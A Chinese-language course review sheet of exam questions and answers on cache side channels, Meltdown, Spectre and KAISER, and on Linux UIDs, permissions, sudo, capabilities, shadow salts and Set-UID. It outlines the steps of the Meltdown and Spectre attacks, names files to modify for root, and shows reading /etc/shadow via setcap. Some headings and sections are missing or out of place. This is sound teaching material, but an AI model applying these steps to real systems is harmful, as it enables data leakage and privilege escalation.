## H.1

1. 当我们多次读取同一个内存地址时，第二次访问通常比第一次快，原因是什么？

-答案：
因为第一次访问后，该地址附近的数据已经被加载进 CPU cache，第二次访问时可以直接从 cache 中读取，不需要再从较慢的主存中读取，所以速度更快。

-详细解释：
CPU 访问主存的速度远慢于访问缓存。第一次读取某个内存地址时，如果数据不在缓存里，会发生 **cache miss**，CPU 需要从主存加载数据。加载完成后，该数据以及附近一段数据会被放入 CPU cache。第二次访问同一个地址时，大概率发生 **cache hit**，访问时间明显变短。
Meltdown 和 Spectre 正是利用这种访问时间差，把 cache 当成侧信道来泄露秘密信息。

-PPT对应位置：
看 PPT 中 **“CPU缓存”**、**“从灯光到 CPU 缓存”**、**“利用 CPU 缓存记住秘密信息”** 这几部分。

-复习重点：
理解 **cache hit 比 cache miss 快**，以及攻击者可以通过测量访问时间判断某个数据是否在 cache 中。

## H.2

2. 在书中使用的 Flush+Reload 技术中，为什么要使用大小为 `256*4096` 的数组，而不是大小为 `256` 的数组？

-答案：
因为 CPU cache 是按块加载的，不是按单个字节加载的。使用 `256*4096` 可以让每个可能的秘密值对应到相距很远的内存位置，避免多个值落入同一个 cache line，从而更准确地区分秘密值。

-详细解释：
如果只使用大小为 `256` 的数组，例如访问 `array[89]`，CPU 可能会把 `array[64]` 到 `array[127]` 这一整段都加载进 cache。这样攻击者之后测量访问时间时，只能知道某一段被缓存了，而不能准确知道到底是 89 还是附近的其他值。

所以攻击中通常使用：

```c
array[secret * 4096]
```

这样不同 secret 对应的地址相隔 4096 字节，远大于普通 cache line 的大小。
例如：

```text
secret = 1  -> array[1 * 4096]
secret = 2  -> array[2 * 4096]
secret = 89 -> array[89 * 4096]
```

每个值对应不同的 cache 区域，Flush+Reload 测量结果会更清楚。

-PPT对应位置：
看 PPT 中 **“清洗+重新加载技术”**、**“清洗+重新加载：清洗步骤”**、**“冲洗+重新装载：重新装载步骤”**。

-复习重点：
重点理解为什么是 `256*4096`：
`256` 表示一个字节有 256 种可能值，`4096` 用来拉开每个值对应地址之间的距离。

## H.3

3. 如何使用 CPU cache 作为侧信道发送数字 89？

-答案：
可以访问 `array[89 * 4096]`，让这个位置进入 CPU cache。接收方随后测量 `array[i * 4096]` 的访问时间，如果发现 `i = 89` 的位置访问最快，就能推断发送的数字是 89。

-详细解释：
攻击者可以先把整个探测数组从 cache 中清除，然后让发送方访问代表数字 89 的位置：

```c
array[89 * 4096]
```

这个访问会让该位置进入 CPU cache。之后接收方依次访问：

```c
array[0 * 4096]
array[1 * 4096]
array[2 * 4096]
...
array[255 * 4096]
```

并测量每次访问所需时间。如果 `array[89 * 4096]` 访问明显更快，说明它已经在 cache 中，因此可以判断发送的数字是 89。

-PPT对应位置：
看 PPT 中 **“利用 CPU 缓存记住秘密信息”** 和 **“清洗+重新加载技术”**。

-复习重点：
把 secret 转换成 cache 状态：
秘密值不是直接输出，而是通过访问某个数组位置留下 cache 痕迹。

## H.4

4. 我们定义了一个大小为 1024 字节的数组。如果 CPU cache size 是 128 字节，也就是说访问地址 `x` 时，从 `x` 到 `x+127` 的内存都会被 CPU 缓存。请描述使用这个数组和 Flush+Reload 技术可以发送多少个不同的值。

-答案：
可以发送 **8 个不同的值**。

-详细解释：
数组大小是 1024 字节，CPU 每次缓存 128 字节。因此整个数组可以分成：

```text
1024 / 128 = 8
```

个可区分的 cache 区域：

```text
第 0 块：0 - 127
第 1 块：128 - 255
第 2 块：256 - 383
第 3 块：384 - 511
第 4 块：512 - 639
第 5 块：640 - 767
第 6 块：768 - 895
第 7 块：896 - 1023
```

Flush+Reload 只能区分哪个 128 字节块被缓存，不能精确区分块内具体哪个字节被访问。因此最多只能编码 8 个不同值。

-PPT对应位置：
看 PPT 中 **“CPU缓存”** 和 **“清洗+重新加载技术”**。

-复习重点：
侧信道能区分的单位不是字节，而是 cache 加载粒度。题目中 cache 粒度是 128 字节，所以 1024 字节数组只能分成 8 个可区分区域。

## H.5

5. 一个秘密数字存储在内核地址 `0xfb102000`。下面的用户态程序试图访问并打印这个数字，会发生什么？

```c
#include <stdio.h>
int main()
{
    char *kernel_data_addr = (char*)0xfb102000;
    char kernel_data = *kernel_data_addr;
    printf("I have reached here.\n");
    return 0;
}
```

-答案：
程序会在读取内核地址时触发异常，通常是 segmentation fault。因此 `printf("I have reached here.\n")` 不会被执行。

-详细解释：
用户态程序不能直接访问内核地址空间。虽然变量 `kernel_data_addr` 可以保存这个地址，但当执行解引用操作：

```c
char kernel_data = *kernel_data_addr;
```

CPU 会进行权限检查。由于当前代码运行在用户态，没有权限读取内核内存，因此会触发 page fault 或 segmentation fault，程序终止。
所以程序不会继续执行到：

```c
printf("I have reached here.\n");
```

-PPT对应位置：
看 PPT 中 **“熔断攻击：初步尝试”** 部分。那里讲的就是用户程序直接访问内核地址会失败。

-复习重点：
用户态可以“写出”内核地址这个数值，但不能真正解引用读取该地址中的内容。

## H.6

6. 一个秘密数字存储在内核地址 `0xfb102000`。你想把它打印出来。请用普通语言描述如何做到这一点。

-答案：
可以利用 Meltdown 的思想：让 CPU 在乱序执行中短暂读取内核地址中的秘密值，再用这个秘密值访问探测数组，使秘密值留下 cache 痕迹，最后通过 Flush+Reload 测量 cache 访问时间恢复秘密值。

-详细解释：
正常情况下，用户态程序直接读取内核地址会失败。但是 Meltdown 利用了 CPU 的乱序执行。CPU 可能会在权限异常真正处理之前，临时执行后续指令。

攻击思路是：

```text
1. 尝试读取内核地址 0xfb102000 中的秘密值。
2. 虽然最终会触发异常，但 CPU 可能已经在瞬态执行中拿到了该值。
3. 用这个秘密值作为索引访问探测数组，例如 array[secret * 4096]。
4. 这个访问会改变 CPU cache 状态。
5. 异常发生后，程序状态被回滚，但 cache 状态不会完全回滚。
6. 攻击者测量 array[i * 4096] 的访问时间。
7. 哪个 i 访问最快，哪个 i 就可能是 secret。
```

所以 Meltdown 不是通过正常的 `printf` 打印内核数据，而是通过 cache 侧信道间接恢复秘密值。

-PPT对应位置：
看 PPT 中 **“熔断攻击”**、**“乱序执行”**、**“使用汇编代码改进攻击”**、**“利用统计方法改进攻击”**。

-复习重点：
Meltdown 的关键链条是：

```text
非法读取内核数据 → 乱序执行短暂使用 secret → secret 影响 cache → Flush+Reload 恢复 secret
```

## H.7

7. 为了提高 Meltdown 攻击的成功率，目标内核内存最好已经被 CPU 缓存，为什么？

-答案：
因为如果目标内核数据已经在 CPU cache 中，读取速度会更快，CPU 更可能在异常处理之前完成瞬态执行并把秘密值编码到 cache 中。

-详细解释：
Meltdown 依赖一个很短的时间窗口：
CPU 在发现权限错误并处理异常之前，可能已经乱序执行了一些后续指令。

如果目标内核数据不在 cache 中，CPU 需要从主存读取，耗时较长。这样还没来得及用 secret 访问探测数组，异常可能就已经被处理，攻击失败概率增加。

如果目标内核数据已经在 cache 中，读取延迟很小，CPU 更可能完成下面的瞬态操作：

```c
array[secret * 4096]
```

这样 secret 就能成功影响 cache，攻击成功率更高。

-PPT对应位置：
看 PPT 中 **“改进：要让秘密数据进入缓存”** 和 **“这样做有什么帮助？”**。

-复习重点：
Meltdown 是否成功，很大程度取决于瞬态执行窗口内能不能完成 secret 到 cache 的编码。cache hit 可以扩大成功概率。

## H.8

8. 如果 CPU 不进行乱序执行，我们还能发动 Meltdown 攻击吗？缺点是什么？

-答案：
典型 Meltdown 攻击基本不能成功。因为 Meltdown 的核心依赖乱序执行在权限检查异常处理之前，短暂执行后续指令并留下 cache 痕迹。

-详细解释：
如果 CPU 严格按顺序执行，那么程序执行到：

```c
char kernel_data = *kernel_data_addr;
```

时，会立即进行权限检查并触发异常。后面的指令不会继续执行，因此 secret 不会被用来访问探测数组，也不会留下 cache 痕迹。

Meltdown 之所以能泄露数据，是因为 CPU 在架构层面最终阻止了非法访问，但在微架构层面，乱序执行已经短暂使用了秘密值，并改变了 cache 状态。

-PPT对应位置：
看 PPT 中 **“乱序执行”**、**“如何证明发生了乱序执行？”**、**“熔断攻击”**。

-复习重点：
Meltdown 的必要条件之一是 CPU 具有乱序执行或瞬态执行行为。没有这个行为，非法访问会直接停止，无法形成侧信道泄露。

## H.9

9. KAISER 可以用来防御 Meltdown。它的主要思想是不把内核内存映射到用户空间。解释为什么这个思想有效。

-答案：
因为 Meltdown 依赖用户态页表中仍然存在内核地址映射。如果内核内存根本不映射到用户空间，那么用户程序访问内核地址时无法完成地址翻译，CPU 就不能在瞬态执行中读到内核数据。

-详细解释：
传统系统中，用户进程的虚拟地址空间里通常包含内核地址映射，只是权限位禁止用户态访问。
也就是说，内核地址“存在映射”，只是“没有权限读”。

Meltdown 利用的正是这种情况：
虽然权限检查最终会失败，但 CPU 在瞬态执行中可能已经根据页表找到物理内存，并短暂使用其中的数据。

KAISER/KPTI 的思想是：
用户态运行时，不再把大部分内核内存映射到用户态页表中。这样用户程序访问内核地址时，不只是权限不够，而是地址本身无法解析到内核物理内存。这样 Meltdown 就失去了读取 secret 的基础。

-PPT对应位置：
看 PPT 中 **“应对措施”** 部分，尤其是讲到 **用户级程序不能直接使用内核内存地址，因为这些地址无法解析**。

-复习重点：
Meltdown 利用的是“有映射但无权限”。KAISER/KPTI 的防御是让用户态下“没有映射”。

## H.10

10. 在 Spectre 攻击中，为什么需要训练 CPU？

-答案：
因为 Spectre 需要误导 CPU 的分支预测器，让 CPU 预测边界检查会通过，从而在错误路径上瞬态执行访问秘密数据的代码。

-详细解释：
Spectre 常见代码模式类似：

```c
if (x < size) {
    temp = array[buffer[x] * 4096];
}
```

正常情况下，如果 `x` 越界，程序不会执行 if 里面的代码。
但现代 CPU 为了提高性能，会进行分支预测。如果之前多次传入合法的 `x`，CPU 会“学到”这个条件经常为真。

训练过程就是反复调用合法输入，例如：

```text
x = 1, 2, 3, 4 ...
```

让 CPU 预测：

```text
x < size
```

大概率成立。
之后攻击者传入恶意越界 `x`。CPU 可能在真正检查完成前，先预测条件为真并瞬态执行 if 内代码。虽然最终发现预测错误并回滚，但 cache 状态已经被改变，秘密值就可能泄露。

-PPT对应位置：
看 PPT 中 **“幽灵攻击 Spectre Attack”**、**“训练”**、**“训练 CPU 进入 True 分支”**。

-复习重点：
Spectre 的关键不是取消边界检查，而是让 CPU 在检查结果出来前错误预测并提前执行。

## H.11

11. 如果 CPU 不进行乱序执行，我们还能发动 Spectre 攻击吗？

-答案：
典型 Spectre 攻击基本不能成功。因为 Spectre 依赖分支预测和瞬态执行，如果 CPU 不提前执行错误路径，就不会越界访问秘密数据，也不会留下 cache 痕迹。

-详细解释：
Spectre 的核心是：

```text
边界检查尚未完成 → CPU 根据训练结果预测条件为真 → 瞬态执行越界访问 → cache 状态泄露 secret
```

如果 CPU 不进行这种投机执行或乱序执行，那么它会等待边界检查真正完成。
当发现 `x` 越界时，if 内代码不会执行，secret 不会被访问，也就不会影响 cache。

因此，没有乱序/投机执行，Spectre 的核心机制就不存在。

-PPT对应位置：
看 PPT 中 **“幽灵攻击 Spectre Attack”** 和 **“乱序执行”** 部分。

-复习重点：
Meltdown 和 Spectre 都依赖瞬态执行，但区别是：
Meltdown 利用异常前的瞬态执行；Spectre 利用分支预测错误后的瞬态执行。

## H.12

12. 在 Spectre 攻击场景中，受保护内存和攻击者程序在同一个进程中，为什么攻击者不能直接访问受保护内存？

-答案：
因为受保护内存虽然和攻击者代码处于同一个进程地址空间，但它受到软件边界、沙箱或 API 检查保护。攻击者不能通过合法程序逻辑直接访问这些内存。

-详细解释：
Spectre 经常发生在同一个进程内部。例如浏览器中，不同 JavaScript 代码、沙箱对象或受保护 buffer 可能在同一进程中运行。

虽然这些数据位于同一虚拟地址空间，但程序会通过边界检查限制访问，例如：

```c
if (x < size) {
    return buffer[x];
}
```

攻击者只能通过这个受限制的接口访问数据，不能直接读取任意位置。
Spectre 利用的是 CPU 的分支预测错误，让 CPU 在瞬态执行中临时绕过这个软件检查。最终程序逻辑仍然认为访问失败，但 cache 状态已经泄露了信息。

-PPT对应位置：
看 PPT 中 **“攻击目标”** 和 **“这种保护模式被广泛应用，用于软件沙箱”** 部分。

-复习重点：
Spectre 突破的通常不是进程隔离，而是同一进程内部的软件隔离或沙箱边界。

## H.13

13. 当我们运行书中的 `SpectreAttack.c` 程序时，为什么总是看到 `array[0*4096 + DELTA]` 在 cache 中？

-答案：
因为当访问失败或边界检查不通过时，函数通常会返回 0。这个返回值 0 之后也会被用来访问探测数组，所以 `array[0*4096 + DELTA]` 经常会进入 cache。

-详细解释：
Spectre 示例程序中，受限制访问函数可能类似：

```c
if (x < size) {
    return buffer[x];
} else {
    return 0;
}
```

当访问不合法或者攻击没有成功时，函数返回 0。随后程序可能执行：

```c
array[value * 4096 + DELTA]
```

如果 `value = 0`，就会访问：

```c
array[0 * 4096 + DELTA]
```

因此在测量 cache 时，经常能看到索引 0 对应的位置也在 cache 中。这个值通常是实验噪声或默认返回值造成的，不一定代表真正泄露的 secret。

-PPT对应位置：
看 PPT 中 **“幽灵攻击”**、**“攻击结果”** 和 **“为什么缓存中会有 0？”**。

-复习重点：
实验结果中 cache 命中不一定全是 secret。索引 0 常常来自默认返回值，需要在分析时排除或特别处理。

## H.14

14. 你的程序运行在沙箱中，只允许访问受保护 buffer 的前 100 个元素，访问必须通过下面的沙箱 API。buffer 地址是 `0xbfff0200`。秘密数字存储在 `0xbfff0100`，但你的程序由于沙箱保护不能访问它。你能得到这个秘密数字吗？如果可以，请描述方法。

```c
int low = 0;
int high = 100;

int restrictedAccess(int x)
{
    if (x > low && x < high) {
        return buffer[x];
    } else {
        return 0;
    }
}
```

-答案：
可以尝试使用 Spectre 攻击。先训练 CPU 让它预测条件 `x > low && x < high` 为真，然后传入一个越界索引 `x = -256`，让 CPU 在瞬态执行中访问 `buffer[-256]`，也就是秘密地址 `0xbfff0100`，再通过 cache 侧信道恢复秘密值。

-详细解释：
已知：

```text
buffer 地址 = 0xbfff0200
secret 地址 = 0xbfff0100
```

计算两者距离：

```text
0xbfff0200 - 0xbfff0100 = 0x100 = 256
```

所以 secret 位于 buffer 前面 256 字节的位置，也就是：

```c
buffer[-256]
```

正常调用：

```c
restrictedAccess(-256)
```

会失败，因为：

```c
x > low && x < high
```

不成立。函数会返回 0。

但是 Spectre 可以利用分支预测：

```text
1. 多次调用 restrictedAccess(1)、restrictedAccess(2) 等合法索引。
2. 训练 CPU 预测 if 条件为真。
3. 然后传入恶意索引 x = -256。
4. CPU 可能在条件判断真正完成前，预测条件为真。
5. 在瞬态执行中读取 buffer[-256]，即 secret。
6. 用 secret 访问探测数组，例如 array[secret * 4096]。
7. 通过 Flush+Reload 测量哪个数组位置访问最快。
8. 最快的位置对应 secret 的值。
```

所以攻击者不是直接绕过沙箱检查，而是利用 CPU 预测错误在瞬态执行中访问受保护数据。

-PPT对应位置：
看 PPT 中 **“幽灵攻击 Spectre Attack”**、**“训练 CPU 进入 True 分支”**、**“攻击目标”**、**“这种保护模式被广泛应用，用于软件沙箱”**。

-复习重点：
这题是 Spectre 的典型边界检查绕过：

```text
训练合法索引 → 传入恶意越界索引 → 瞬态读取 secret → cache 泄露 secret
```

1. 下面是 `/etc/passwd` 文件中的一条记录。用户 `bob` 的数字用户 ID 是多少？

```text
bob:x:2000:3000:SEED,,,:/home/bob:/bin/bash
```

-答案：
用户 `bob` 的用户 ID，也就是 UID，是 **2000**。

-详细解释：
`/etc/passwd` 中每一行的基本格式是：

```text
用户名:密码占位符:UID:GID:用户说明:家目录:登录shell
```

所以这条记录：

```text
bob:x:2000:3000:SEED,,,:/home/bob:/bin/bash
```

可以拆成：

```text
用户名       bob
密码占位符   x
UID          2000
GID          3000
用户说明     SEED,,,
家目录       /home/bob
登录 shell   /bin/bash
```

因此 bob 的数字用户 ID 是第三个字段，也就是 **2000**。

-PPT对应位置：
看 S01 PPT 里 **“用户（Users）”** 和 **“查找用户 ID”** 部分。

-复习重点：
`/etc/passwd` 第三个字段是 UID，第四个字段是 GID。

## S1.2

2. root 用户的用户 ID 是多少？为什么 root 比普通用户有特殊权限？是因为它的用户名叫 root 吗？

-答案：
root 用户的 UID 是 **0**。root 拥有特殊权限不是因为它的用户名叫 `root`，而是因为它的 UID 是 0。

-详细解释：
Linux 系统判断用户身份时，真正依赖的是数字 UID，而不是用户名字符串。

`root` 这个名字本身没有魔法。真正特殊的是：

```text
UID = 0
```

Linux 内核把 UID 为 0 的用户视为超级用户。超级用户可以绕过很多普通访问控制限制，比如读取系统文件、修改系统配置、管理其他用户等。

所以如果某个账户的名字不是 root，但 UID 被设置成 0，它也会拥有 root 权限。

-PPT对应位置：
看 S01 PPT 里 **“谈谈 root 用户的特殊 ID 0”** 部分。

-复习重点：
root 特权来自 **UID 0**，不是来自用户名 `root`。

## S1.3

3. Alice 属于 `abc` 组。她对下面这个文件有什么权限？

```text
-rwxr--r-- seed abc 1802 Feb 6 11:39 xyz
```

-答案：
Alice 对文件 `xyz` 有 **读权限**，没有写权限，也没有执行权限。

-详细解释：
文件权限是：

```text
-rwxr--r--
```

可以拆成：

```text
-    rwx    r--    r--
类型 owner group others
```

文件所有者是：

```text
seed
```

文件所属组是：

```text
abc
```

Alice 属于 `abc` 组，所以她使用的是 **group 权限**，也就是：

```text
r--
```

因此 Alice 可以读取文件内容，但不能修改，也不能执行。

-PPT对应位置：
看 S01 PPT 里 **“传统权限模式”** 和 **“文件权限”** 部分。

-复习重点：
判断文件权限时按这个顺序：

```text
1. 如果是文件所有者，用 owner 权限
2. 如果属于文件所属组，用 group 权限
3. 否则用 others 权限
```

## S1.4

4. 运行下面命令后，文件 `xyz` 的权限会变成什么？

```bash
chmod 543 xyz
```

-答案：
文件权限会变成：

```text
-r-xr---wx
```

也就是：

```text
owner:  r-x
group:  r--
others: -wx
```

-详细解释：
Linux 中权限数字的含义是：

```text
r = 4
w = 2
x = 1
```

所以：

```text
5 = 4 + 1 = r-x
4 = 4     = r--
3 = 2 + 1 = -wx
```

因此：

```bash
chmod 543 xyz
```

表示：

```text
owner  = 5 = r-x
group  = 4 = r--
others = 3 = -wx
```

所以最终权限是：

```text
-r-xr---wx
```

-PPT对应位置：
看 S01 PPT 里 **“文件权限”** 部分，里面讲了权限的八进制表示和 `chmod`。

-复习重点：
记住：

```text
r = 4
w = 2
x = 1
```

然后把数字拆开即可。

## S1.5

5. 如果 `umask` 的值是 `0427`，当我们创建一个非可执行文件时，它的权限是什么？

-答案：
新创建的非可执行文件权限是：

```text
0240
```

也就是：

```text
--w-r-----
```

-详细解释：
非可执行普通文件的默认初始权限通常是：

```text
0666
```

也就是：

```text
rw-rw-rw-
```

`umask` 的作用不是赋予权限，而是屏蔽权限。计算公式是：

```text
最终权限 = 初始权限 AND NOT(umask)
```

题目给出：

```text
umask = 0427
```

忽略最前面的特殊位，主要看：

```text
427
```

逐位计算：

```text
owner:  6 & ~4 = 2  => -w-
group:  6 & ~2 = 4  => r--
others: 6 & ~7 = 0  => ---
```

所以结果是：

```text
240
```

写成权限字符串就是：

```text
--w-r-----
```

-PPT对应位置：
看 S01 PPT 里 **“默认文件权限”** 和 **“示例（umask）”** 部分。PPT 特别提醒：这个运算不是 XOR，也不是简单减法，而是 `Initial AND NOT(umask)`。

-复习重点：
普通文件默认从 `666` 开始算，目录默认从 `777` 开始算。
`umask` 是“拿掉权限”，不是“添加权限”。

## S1.6

6. 账户 `bob` 是普通用户账户。root 用户想让 bob 可以用超级用户权限运行命令，但不想给 bob root 密码。root 应该怎么做？

-答案：
root 可以给 bob 配置 `sudo` 权限，例如通过 `/etc/sudoers` 文件授权 bob 使用 `sudo` 运行特权命令。

-详细解释：
`sudo` 的作用是允许被授权的普通用户以超级用户或其他用户身份运行命令。

root 不需要把 root 密码告诉 bob。bob 只要被写入 sudo 授权规则，就可以通过：

```bash
sudo command
```

以 root 权限执行指定命令。

实际系统中，一般使用：

```bash
visudo
```

安全地编辑 `/etc/sudoers` 文件，避免语法错误导致 sudo 无法使用。

也可以把 bob 加入具有 sudo 权限的用户组，例如 Ubuntu 中常见的 `sudo` 组。

-PPT对应位置：
看 S01 PPT 里 **“使用 sudo”** 部分。

-复习重点：
`sudo` 的核心是授权，不是共享 root 密码。授权信息主要由 `/etc/sudoers` 控制。

## S1.7

7. 我们被允许通过 `sudo` 使用超级用户权限运行命令。如何获得 root shell？

-答案：
可以使用下面这些命令获得 root shell：

```bash
sudo -s
```

或者：

```bash
sudo bash
```

也可以：

```bash
sudo su
```

-详细解释：
`sudo` 可以让用户以 root 权限运行某个命令。如果运行的命令本身是 shell，例如 `bash`，那么就会进入一个 root shell。

```bash
sudo bash
```

表示以 root 权限启动一个 bash shell。

但是从安全角度看，不建议长期使用 root shell。更推荐只在需要时使用：

```bash
sudo command
```

运行单个特权命令。

-PPT对应位置：
看 S01 PPT 里 **“获取 Root Shell”** 部分，PPT 列出了 `sudo -s`、`sudo bash`、`sudo su`。

会写出获得 root shell 的命令，同时要知道长期使用 root shell 风险更大。

## S1.8

8. 攻击者通过利用系统漏洞，获得了修改系统任意文件的机会。攻击者可以修改哪些文件，使修改后能获得 root 权限？请说出两个文件。假设攻击者已经有普通用户账户。

-答案：
可以修改：

```text
/etc/passwd
/etc/sudoers
```

也可以回答：

```text
/etc/shadow
```

题目要求两个，常见答案是 `/etc/passwd` 和 `/etc/sudoers`。

-详细解释：
如果攻击者可以修改 `/etc/passwd`，他可以添加一个 UID 为 0 的新用户，或者把自己账户的 UID 改成 0。因为 Linux 中 UID 0 拥有 root 权限，所以攻击者之后登录该账户就能获得 root 权限。

如果攻击者可以修改 `/etc/sudoers`，他可以把自己的普通用户账户加入 sudo 授权规则。这样他就可以通过：

```bash
sudo command
```

执行 root 命令。

如果攻击者可以修改 `/etc/shadow`，他也可能修改 root 的密码哈希，或者修改自己账户的密码哈希，从而获得更高权限。

-PPT对应位置：
看 S01 PPT 里这些部分：

```text
“谈谈 root 用户的特殊 ID 0”
“使用 sudo”
“密码文件”
“影子文件”
```

-复习重点：
重点记住这几个敏感文件：

```text
/etc/passwd   账户信息，包含 UID/GID
/etc/shadow   密码哈希
/etc/sudoers  sudo 授权规则
```

## S1.9

9. POSIX capabilities 的主要目标是什么？

-答案：
POSIX capabilities 的主要目标是把 root 的超级权限拆分成更小、更细粒度的权限单元，让程序只拥有完成任务所需的特定权限，而不是获得完整 root 权限。

-详细解释：
传统 Linux 权限模型中，root 权限非常大。一个程序如果以 root 权限运行，一旦被攻击者利用，攻击者可能获得整个系统的控制权。

POSIX capabilities 把 root 权限拆成很多小能力，例如：

```text
CAP_NET_RAW
CAP_DAC_READ_SEARCH
CAP_SYS_ADMIN
```

这样某个程序只需要网络原始套接字能力，就可以只给它 `CAP_NET_RAW`，而不需要让它拥有完整 root 权限。

这符合 **最小权限原则**。

-PPT对应位置：
看 S01 PPT 里 **“POSIX 功能”** 部分。

-复习重点：
capabilities 的本质是：

```text
把 root 权限拆小，减少程序拥有的多余权限。
```

## S1.10

10. 我们运行下面这一组命令。① 和 ② 处的结果分别是什么？

```bash
cp /usr/bin/cat mycat
mycat /etc/shadow        # ①

sudo setcap CAP_DAC_READ_SEARCH=ep mycat
mycat /etc/shadow        # ②
```

-答案：
① 处：读取失败，因为普通 `mycat` 没有权限读取 `/etc/shadow`。
② 处：读取成功，因为 `mycat` 获得了 `CAP_DAC_READ_SEARCH` capability，可以绕过普通文件读权限检查。

-详细解释：
`/etc/shadow` 保存密码哈希，普通用户通常不能读取。刚复制出来的 `mycat` 只是普通程序，所以执行：

```bash
mycat /etc/shadow
```

会因为权限不足失败。

然后执行：

```bash
sudo setcap CAP_DAC_READ_SEARCH=ep mycat
```

这会给 `mycat` 添加 capability：

```text
CAP_DAC_READ_SEARCH
```

该能力允许程序绕过普通的文件读权限和目录搜索权限检查。

所以第二次运行：

```bash
mycat /etc/shadow
```

就可以成功读取 `/etc/shadow`。

其中：

```text
e = effective   执行时生效
p = permitted   被允许使用
```

-PPT对应位置：
看 S01 PPT 里 **“设置文件功能（1）”** 和 **“设置文件功能（2）”** 部分。

-复习重点：
`setcap` 可以给普通程序添加特定能力，使它不必成为完整 root 程序也能完成某些特权操作。

## S1.11

11. `/etc/passwd` 文件叫 password file，但实际上它并不包含账户密码。请解释为什么。

-答案：
因为 `/etc/passwd` 需要被很多程序读取，通常对普通用户可读。如果密码哈希存放在里面，攻击者就可以读取哈希并离线破解。所以现代 Linux 把密码哈希存放在权限更严格的 `/etc/shadow` 文件中。

-详细解释：
早期 Unix 系统确实把密码哈希放在 `/etc/passwd` 中。
但是 `/etc/passwd` 还包含很多系统需要公开读取的信息，例如：

```text
用户名
UID
GID
家目录
登录 shell
```

很多普通程序需要读取这些信息，所以 `/etc/passwd` 通常是全局可读的。

如果密码哈希也放在这里，攻击者就可以直接复制哈希，然后进行字典攻击、暴力破解或彩虹表攻击。

因此现代系统中 `/etc/passwd` 的密码字段通常是：

```text
x
```

表示真正的密码哈希在：

```text
/etc/shadow
```

中。

-PPT对应位置：
看 S01 PPT 里 **“密码文件”** 和 **“影子文件”** 部分。

-复习重点：
`/etc/passwd` 存账户信息，`/etc/shadow` 存密码哈希。

## S1.12

12. shadow 文件中 salt 的目的是什么？

-答案：
salt 的目的是让相同密码产生不同哈希，从而抵抗彩虹表攻击、字典攻击和预计算攻击。

-详细解释：
如果没有 salt，相同密码总是会产生相同哈希。
例如两个用户都使用密码：

```text
123456
```

那么它们的哈希值也会一样。攻击者看到两个哈希相同，就能知道这两个用户密码相同。

更严重的是，攻击者可以提前计算常见密码的哈希表：

```text
123456      -> hash1
password    -> hash2
qwerty      -> hash3
```

这类预计算表可以用来快速破解密码。

加入 salt 后，计算方式变成：

```text
hash = H(salt + password)
```

每个用户的 salt 不同，即使密码相同，最终哈希也不同。攻击者不能用一张通用彩虹表破解所有用户，而必须针对每个 salt 重新计算，攻击成本大大提高。

-PPT对应位置：
看 S01 PPT 里 **“盐的用途”** 部分。

-复习重点：
salt 通常不是秘密。它的作用是让密码哈希个性化，防止相同密码产生相同哈希，并削弱彩虹表攻击。

Set-UID 程序访问文件时看 **EUID**，不是看 RUID。

## S2.2

2. 一个进程试图打开一个文件进行读取。该进程的有效用户 ID 是 1000，真实用户 ID 是 2000。该文件允许用户 ID 2000 读取，但不允许用户 ID 1000 读取。这个进程能成功打开该文件吗？

-答案：
不能成功打开。

-详细解释：
文件访问权限检查主要根据进程的 **有效用户 ID EUID** 来进行。

```text
EUID = 1000
RUID = 2000
```

文件只允许 UID 2000 读取，不允许 UID 1000 读取。虽然进程的真实用户 ID 是 2000，但打开文件时系统检查的是 EUID，也就是 1000。

由于 UID 1000 没有读取权限，所以 `open()` 会失败。

看 PPT 中 **“Set-UID 原理”**，尤其是访问控制通过 EUID 实现的部分。

-复习重点：
普通文件访问控制看 EUID。RUID 主要表示是谁启动了程序，但权限判断主要看 EUID。

## S2.3

3. 一个 root 拥有的 Set-UID 程序允许普通用户在执行程序期间获得 root 权限。是什么阻止用户利用这个权限做坏事？

-答案：
阻止用户乱用 root 权限的是 **Set-UID 程序自身的代码逻辑限制**。

-详细解释：
普通用户运行 root-owned Set-UID 程序时，程序执行期间：

```text
RUID = 普通用户
EUID = root
```

这意味着程序拥有 root 权限。但用户并不是直接拿到了一个自由的 root shell，而是只能让这个程序执行它代码里已经写好的操作。

例如 `passwd` 程序可以修改 `/etc/shadow`，但它的代码逻辑会限制用户只能修改自己的密码，而不是随便修改别人的密码或执行任意 root 命令。

所以安全性依赖于：

```text
1. 程序是否严格限制用户能做什么
2. 程序是否正确检查用户输入
3. 程序是否避免调用不安全外部命令
4. 程序是否遵守最小权限原则
```

如果 Set-UID 程序有漏洞，比如缓冲区溢出、命令注入、竞态条件，攻击者就可能突破这些限制，滥用 root 权限。

-PPT对应位置：
看 PPT 中 **“Set-UID 如何保证安全？”**、**“代理超人攻击”**、**“Set-UID 程序的攻击面”** 部分。

-复习重点：
Set-UID 的安全性不是因为用户没有 root 权限，而是因为用户只能通过受限制的程序逻辑使用 root 权限。

## S2.4

4. 我们想把一个由 `seed` 用户拥有的程序 `prog` 变成 root 拥有的 Set-UID 程序。运行下面命令能达到目标吗？

```bash
sudo chmod 4755 prog
sudo chown root prog
```

-答案：
不能达到目标。

-详细解释：
第一条命令：

```bash
sudo chmod 4755 prog
```

会给 `prog` 设置 Set-UID 位。

但是第二条命令：

```bash
sudo chown root prog
```

会把文件所有者改成 root。Linux 出于安全原因，在执行 `chown` 改变文件所有者时，会自动清除 Set-UID 位。

因此最终结果是：`prog` 的所有者变成了 root，但 Set-UID 位被清除了。它不会成为 root-owned Set-UID 程序。

正确顺序应该是：

```bash
sudo chown root prog
sudo chmod 4755 prog
```

也就是先改 owner，再设置 Set-UID 位。

-PPT对应位置：
看 PPT 中 **“将一般程序转换为 Set-UID”** 部分。PPT 里也强调：`chown` 要先执行，然后再执行 `chmod`，否则 Set-UID bit 会被重置。

-复习重点：
创建 root-owned Set-UID 程序的顺序：

```text
先 chown root
后 chmod 4755
```

## S2.5

5. 当 `chown` 命令改变一个 Set-UID 程序的所有者时，会自动禁用 Set-UID 位。请解释为什么要这样做。

-答案：
这是为了防止普通用户借助 owner 改变制造特权 Set-UID 程序，从而导致权限提升。

-详细解释：
假设系统不清除 Set-UID 位，那么可能出现危险情况。

例如某个用户先创建一个自己控制的程序，并设置 Set-UID 位。之后如果这个程序的 owner 被改成 root，而 Set-UID 位仍然保留，那么这个程序就会变成 root-owned Set-UID 程序。

这样普通用户运行它时就可能获得 root 权限。

因此 Linux 在 `chown` 改变文件所有者时，会自动清除 Set-UID 位。这样可以强制管理员在改变 owner 之后，如果确实需要 Set-UID，必须再次显式执行：

```bash
chmod 4755 prog
```

这可以避免无意或恶意地制造特权程序。

-PPT对应位置：
看 PPT 中 **“将一般程序转换为 Set-UID”** 部分。

-复习重点：
